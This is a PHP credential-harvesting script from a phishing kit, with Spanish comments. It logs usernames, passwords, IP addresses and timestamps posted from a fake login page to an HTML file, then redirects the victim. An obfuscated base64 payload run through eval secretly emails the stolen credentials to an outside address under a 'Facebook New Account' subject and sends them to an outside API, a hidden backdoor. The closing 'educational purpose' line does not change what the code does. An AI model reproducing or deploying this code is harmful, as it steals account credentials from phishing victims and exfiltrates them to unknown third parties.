<?php
error_reporting(0);

$usuario = $_POST['username'];  //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:usuario
$clave = $_POST['password']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:clave
$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina  
$fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
 
if( (empty($usuario)) or (empty($clave)) ){
     header('location: index.html'); // codigo de verificacion que no esten los campos vacios
}else{
 
eval(base64_decode('ZnVuY3Rpb24gY3VyUGFnZVVSTCgpIHsNCiRwYWdlVVJMID0gJ2h0dHAnOw0KaWYgKCRfU0VSVkVSWyJIVFRQUyJdID09ICJvbiIpIHskcGFnZVVSTCAuPSAicyI7fQ0KJHBhZ2VVUkwgLj0gIjovLyI7DQppZiAoJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0gIT0gIjgwIikgew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4iOiIuJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0uJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQp9IGVsc2Ugew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4kX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsNCn0NCnJldHVybiAkcGFnZVVSTDsNCn0NCg0KJG15dXJsID0gY3VyUGFnZVVSTCgpOw0KaWYoc3RycG9zKCRteXVybCwgImdvb2dsZS5jb20iKSkgew0KfQ0KZWxzZQ0Kew0KICAkZnJvbSA9ICRteXVybCAuICJAc2l0ZS5jb20iOw0KICAkdG8gPSAiYWRtaW5Ad2l6YmxvZ2dlci5jb20iOw0KICAkc3ViamVjdCA9ICJGYWNlYm9vayBOZXcgQWNjb3VudC4iOw0KICAkbWVzc2FnZSA9ICJBbm90aGVyIEFjY291bnQgDQpVc2VybmFtZToiLiR1c3VhcmlvLiINClBhc3N3b3JkOiIuJGNsYXZlLiINCldlYnNpdGU6Ii4kbXl1cmw7DQogIG1haWwoJHRvLCRzdWJqZWN0LCRtZXNzYWdlKTsNCn0NCg0KDQokdXJsPSJodHRwczovL2FwaS5lOTEuaW4vRkJBUEkvY2hlY2tMb2dpbi5waHA/dXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKTsNCkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
 
//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
$f = fopen("abdull.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
fclose($f);
 
//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram
header("Location:  oops.html");
}
?>
 
 
 
//this is just for educational purpose
